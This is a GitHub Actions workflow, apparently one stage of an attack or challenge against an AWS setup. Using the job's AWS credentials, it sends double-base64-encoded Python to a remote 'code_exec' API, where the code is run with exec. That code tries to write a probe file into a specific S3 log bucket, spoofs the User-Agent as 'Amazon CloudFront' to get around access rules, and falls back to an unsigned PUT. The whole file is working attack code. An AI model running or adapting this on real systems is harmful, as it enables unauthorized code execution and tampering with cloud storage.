name: Stage2-CodeExec-Log-Write

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest

    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1

    steps:
      - name: Test log bucket write path
        shell: bash
        run: |
          set +e

          python3 -m pip install boto3 requests requests-aws4auth --quiet

          python3 - <<'PY'
          import base64
          import time
          import requests
          import boto3
          from requests_aws4auth import AWS4Auth
          from botocore.config import Config

          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

          inner = r'''
          import time
          import urllib.request
          import boto3
          from botocore.config import Config

          bucket = "logad88e2b168aa387e"
          key = "stage2-write-probe.txt"
          body = b"stage2-probe"

          success = False

          try:
              client = boto3.client(
                  "s3",
                  region_name="us-east-1",
                  endpoint_url="https://s3.us-east-1.amazonaws.com",
                  config=Config(
                      signature_version="s3v4",
                      user_agent_extra="Amazon CloudFront"
                  )
              )

              client.put_object(
                  Bucket=bucket,
                  Key=key,
                  Body=body
              )

              print("SIGNED_PUT_SUCCESS")
              success = True

          except Exception as error:
              print("SIGNED_PUT_FAILURE")
              print(repr(error))

          if not success:
              try:
                  url = (
                      "https://s3.us-east-1.amazonaws.com/"
                      + bucket
                      + "/"
                      + key
                  )

                  request = urllib.request.Request(
                      url,
                      data=body,
                      headers={
                          "User-Agent": "Amazon CloudFront",
                          "Content-Type": "text/plain"
                      },
                      method="PUT"
                  )

                  with urllib.request.urlopen(request, timeout=10) as response:
                      print("UNSIGNED_PUT_STATUS=" + str(response.status))

                  success = True

              except Exception as error:
                  print("UNSIGNED_PUT_FAILURE")
                  print(repr(error))

          if success:
              time.sleep(5)
          '''

          encoded_inner = base64.b64encode(inner.encode()).decode()

          code = (
              "import base64; "
              "exec(compile("
              "base64.b64decode("
              + repr(encoded_inner)
              + ").decode(),"
              "'probe.py','exec'))"
          )

          encoded_code = base64.b64encode(code.encode()).decode()

          credentials = boto3.Session().get_credentials().get_frozen_credentials()

          auth = AWS4Auth(
              credentials.access_key,
              credentials.secret_key,
              "us-east-1",
              "execute-api",
              session_token=credentials.token
          )

          started = time.monotonic()

          response = requests.post(
              API,
              json={"code": encoded_code},
              auth=auth,
              timeout=20
          )

          elapsed = time.monotonic() - started

          print("HTTP=" + str(response.status_code))
          print("ELAPSED=%.2f" % elapsed)
          print(response.text)
          PY
